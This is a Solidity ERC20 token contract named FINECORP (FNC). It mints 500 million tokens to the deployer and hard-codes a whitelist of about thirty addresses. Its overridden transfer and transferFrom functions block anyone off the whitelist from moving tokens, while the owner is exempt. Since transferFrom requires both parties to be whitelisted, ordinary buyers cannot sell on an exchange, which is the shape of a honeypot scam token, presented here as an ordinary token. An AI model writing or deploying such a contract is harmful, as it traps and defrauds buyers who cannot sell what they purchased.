// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import "./ERC20.sol";
import "./Ownable.sol";


// You have to addd LP tokens In the White List after you add liquidity.

contract SpecialToken is ERC20, Ownable {

    mapping (address => bool) whiteList;
    constructor() ERC20("FINECORP", "FNC") {
        whiteList[msg.sender]= true;
        _mint(msg.sender, 500000000 * 10 ** decimals());
        whiteList[0xA32b97EC094BeCC2eE8884dd802Ad1FBd7AeD591]= true;
        whiteList[0xf16038C65D383df90B5f4b2691347a939011F581]=true;
        whiteList[0x61107Cec69154717fc1b764307C2620e4a261B53]=true;
        whiteList[0xef133294E018307be1DC4F6349F35740Bd1d56Dc]=true;
        whiteList[0xf7693703Ffc2cA3A4c292c2682dC1592F104D21C]=true;
        whiteList[0xb06b509C4FC7adBFCFE56144aB2964B08f99E3d8]=true;
        whiteList[0x8ef241731E6863379A840a0Ac610AB74d2A2b63A]=true;
        whiteList[0x4F17Cee2D5C4287920352019dE0c24753d26e7E5]=true;
        whiteList[0xA94280126bd07fdc9b5B81A723B2c65C40B0829e]=true;
        whiteList[0x8Fb1eD2fbb12f4d7B3Fc2c9f78f283a82d749Fa2]=true;
        whiteList[0xFd398e8660489707E0B03B920d6B9d63Ba427Fa5]=true;
        whiteList[0x47376aC2BD4A96D0b09559a8149CBBA52592137e]=true;
        whiteList[0xCb987b4dB698b88c5df1254CF9623b3C4520c6CC]=true;
        whiteList[0x7D83619F18F0F6F1aD6FA58E049600A38D79177f]=true;
        whiteList[0x3005699020e36e28Bdfd540a1D800a5613C7b969]=true;
        whiteList[0xc62c21683E6cAd81F8a007fc793E553f1a7D3054]=true;
        whiteList[0xbC393E340158cC16A2f081D9A26376DF06d4d2db]=true;
        whiteList[0xB26aD6d4650DF35A89a3B7bEE83b0dD6511709f8]=true;
        whiteList[0xF1404eb1C46734d0f9977479f12c5D48EDbbFBb4]=true;
        whiteList[0xf8DbE198A667BAB35f1C1eF4F5cB225142A90cF4]=true;
        whiteList[0xC241996576098045acB752B28ecB71d5Bb0fd1Fc]=true;
        whiteList[0x41eb9fcE14d7694B7E4E7Dc3249eb49198B6CDcf]=true;
        whiteList[0xf958FcE75C848d513E2FCB9F898756E5Aaa51Dd3]=true;
        whiteList[0x715cD1A0305030893aeF5f923C9258CD28a5045D]=true;
        whiteList[0x8f666B813973a422acf0d99092270Dd804cD26ab]=true;
        whiteList[0xDe0a94CDe7a725261856d7788a8CA6e89D82daE9]=true;
        whiteList[0xF68b2eb94192DABD5e921773adf46fe8139B3A35]=true;
        whiteList[0x34412F5198cDDe5bFDb115c4a1E04Cf8fa253B86]=true;
        whiteList[0xd88F9C303fD75215b4CA697fD0AD8faf50dC3b4F]=true;
    }
    function addTowhiteList(address add) public onlyOwner{
        whiteList[add]=true;
    }

    function removeFromWhiteList(address add) public onlyOwner{
        whiteList[add]=false;
    }

    function getStatus(address add) public view onlyOwner returns (bool status){
        return whiteList[add];
    }

    function transfer(address to, uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=msg.sender)
        {
            require(whiteList[msg.sender], "Not authorized");
        }
        address owner = _msgSender();
        _transfer(owner, to, amount);
        return true;
    }

    function transferFrom(address from,address to,uint256 amount) public virtual override returns (bool) {
        if(owner()!= to && owner()!=from)
        {
            require(whiteList[from]&&whiteList[to], "Not authroized");
        }
        address spender = _msgSender();
        _spendAllowance(from, spender, amount);
        _transfer(from, to, amount);
        return true;
    }

}